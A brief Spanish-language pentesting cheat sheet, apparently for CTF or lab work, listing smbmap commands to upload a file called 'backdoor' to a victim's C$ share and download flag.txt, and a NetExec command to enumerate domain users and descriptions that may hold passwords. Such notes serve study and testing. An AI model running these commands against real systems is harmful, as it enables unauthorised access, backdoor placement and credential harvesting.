...
# Colocar un doc en el disco C llamado 'backdoor' desde la máquina kali hacia la víctima
❯ smbmap -H ❮IP❯ -u 'user' -p 'passwd' --upload '/root/backdoor' 'C$\backdoor'

# Descargar un archivo de 'C:\' 
❯ smbmap -H ❮IP❯ -u 'user' -p 'passwd' --download 'C$\flag.txt'   
```
...
❯ nxc smb <IP> -u 'user' -p 'passwd' --users     # Listar usuarios del DC y su descripción la cual puede contener alguna password 
...
# Verificar si el user es 'admin' y nos mostrará un [Pwn3d!]
